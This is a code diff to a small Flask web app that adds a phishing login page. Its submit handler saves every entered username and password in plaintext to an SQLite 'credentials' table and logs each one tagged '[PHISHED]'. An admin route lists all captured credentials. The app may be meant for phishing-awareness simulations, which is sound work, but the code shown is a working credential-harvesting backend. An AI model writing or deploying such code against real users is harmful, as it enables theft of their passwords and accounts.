@@ -1,6 +1,7 @@
 from flask import Flask, render_template, request
 from datetime import datetime
 import sqlite3
+from flask import request
 
 app = Flask(__name__)
 
@@ -36,6 +37,36 @@ def dashboard():
     conn.close()
 
     return render_template('dashboard.html', clicks=clicks)
+
+@app.route('/login')
+def login_page():
+    return render_template('login.html')
+
+@app.route('/submit-login', methods=['POST'])
+def submit_login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    timestamp = datetime.now().isoformat()
+
+    # Save to database
+    conn = sqlite3.connect('database.db')
+    c = conn.cursor()
+    c.execute("INSERT INTO credentials (username, password, timestamp) VALUES (?, ?, ?)",
+              (username, password, timestamp))
+    conn.commit()
+    conn.close()
+
+    print(f"[PHISHED] username={username} | password={password} | time={timestamp}")
+    return render_template('phished.html', username=username)
+
+@app.route('/admin')
+def admin_dashboard():
+    conn = sqlite3.connect('database.db')
+    c = conn.cursor()
+    c.execute("SELECT username, password, timestamp FROM credentials ORDER BY timestamp DESC")
+    credentials = c.fetchall()
+    conn.close()
+    return render_template('admin.html', credentials=credentials)
 
 if __name__ == '__main__':
     app.run(debug=True)
